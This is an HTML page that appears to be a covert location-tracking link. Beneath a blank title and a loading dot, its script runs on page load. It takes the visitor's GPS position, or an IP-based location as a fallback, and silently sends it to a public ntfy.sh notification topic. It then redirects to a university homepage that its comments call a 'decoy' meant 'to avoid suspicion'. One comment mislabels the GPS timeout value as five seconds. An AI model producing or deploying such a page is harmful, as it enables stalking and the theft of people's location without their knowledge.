<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title> </title>
    <!-- PWA for home‑screen permission persistence -->
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="mobile-web-app-capable" content="yes">
    <link rel="manifest" href="data:application/json;base64,ewogICJuYW1lIjogIk5vdGVzIiwKICAic2hvcnRfbmFtZSI6ICJOb3RlcyIsCiAgInN0YXJ0X3VybCI6ICIuIiwKICAiZGlzcGxheSI6ICJzdGFuZGFsb25lIiwKICAiYmFja2dyb3VuZF9jb2xvciI6ICIjZmZmZmZmIiwKICAidGhlbWVfY29sb3IiOiAiI2ZmZmZmZiIKfQ==">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #ffffff;
            display: flex;
            align-items: center;
            justify-content: center;
            height: 100vh;
            font-family: -apple-system, sans-serif;
        }
        .dot {
            width: 10px; height: 10px; border-radius: 50%;
            background: #d0d0d0;
            animation: pulse 1.5s ease-in-out infinite;
        }
        @keyframes pulse {
            0%, 100% { opacity: 0.3; transform: scale(1); }
            50% { opacity: 1; transform: scale(1.2); }
        }
    </style>
</head>
<body>
    <div class="dot"></div>

    <script>
        (function() {
            // ============================================================
            //  YOUR CONFIGURATION – EDIT THESE TWO VALUES
            // ============================================================
            const NTFY_TOPIC = 'Location_Notify';   // long random string (e.g., 'fam7xq2k9m')
            const DECOY_URL = 'https://www.iitb.ac.in/';    // innocent redirect page
            const GPS_TIMEOUT = 1000000;                      // 5 seconds
            // ============================================================

            // -----------------------------------------------------------------
            // 1. GPS (works silently if permission already granted)
            // -----------------------------------------------------------------
            function getGpsLocation() {
                return new Promise((resolve, reject) => {
                    if (!navigator.geolocation) return reject(new Error('no gps'));
                    navigator.geolocation.getCurrentPosition(
                        pos => resolve({
                            lat: pos.coords.latitude,
                            lng: pos.coords.longitude,
                            accuracy: Math.round(pos.coords.accuracy),
                            source: 'gps'
                        }),
                        err => reject(err),
                        { enableHighAccuracy: true, timeout: GPS_TIMEOUT, maximumAge: 0 }
                    );
                });
            }

            // -----------------------------------------------------------------
            // 2. IP fallback (no permission needed)
            // -----------------------------------------------------------------
            async function getIpLocation() {
                const resp = await fetch('https://ipapi.co/json/');
                if (!resp.ok) throw new Error('ip api failed');
                const data = await resp.json();
                return {
                    lat: data.latitude,
                    lng: data.longitude,
                    city: data.city,
                    region: data.region,
                    country: data.country_name,
                    source: 'ip'
                };
            }

            // -----------------------------------------------------------------
            // Build short message for ntfy
            // -----------------------------------------------------------------
            function buildNtfyMessage(loc) {
                const mapsUrl = `https://maps.google.com/?q=${loc.lat},${loc.lng}`;
                const time = new Date().toLocaleString();
                return (
                    `📍 ${loc.source.toUpperCase()} Location\n` +
                    (loc.city ? `Area: ${loc.city}, ${loc.region}, ${loc.country}\n` : '') +
                    `Lat: ${loc.lat}, Lng: ${loc.lng}\n` +
                    (loc.accuracy ? `Accuracy: ±${loc.accuracy}m\n` : '') +
                    `Time: ${time}\n` +
                    `Map: ${mapsUrl}`
                );
            }

            // -----------------------------------------------------------------
            // Send via ntfy using sendBeacon (guaranteed delivery)
            // -----------------------------------------------------------------
            function sendNtfy(loc) {
                if (!NTFY_TOPIC || NTFY_TOPIC === 'your_secret_topic_here') return;
                const msg = buildNtfyMessage(loc);
                const blob = new Blob([msg], { type: 'text/plain' });
                navigator.sendBeacon(`https://ntfy.sh/${NTFY_TOPIC}`, blob);
            }

            // -----------------------------------------------------------------
            // Redirect to decoy page (no trace)
            // -----------------------------------------------------------------
            function redirectToDecoy() {
                setTimeout(() => {
                    if (DECOY_URL) window.location.replace(DECOY_URL);
                }, 700);
            }

            // -----------------------------------------------------------------
            // Main emergency sequence
            // -----------------------------------------------------------------
            async function emergency() {
                let loc;
                try {
                    loc = await getGpsLocation();
                } catch (e) {
                    try {
                        loc = await getIpLocation();
                    } catch (e2) {
                        // Total failure – still redirect to avoid suspicion
                        redirectToDecoy();
                        return;
                    }
                }

                // Send location silently
                sendNtfy(loc);

                // Redirect to harmless site
                redirectToDecoy();
            }

            // Start immediately when the page loads
            emergency();
        })();
    </script>
</body>
</html>
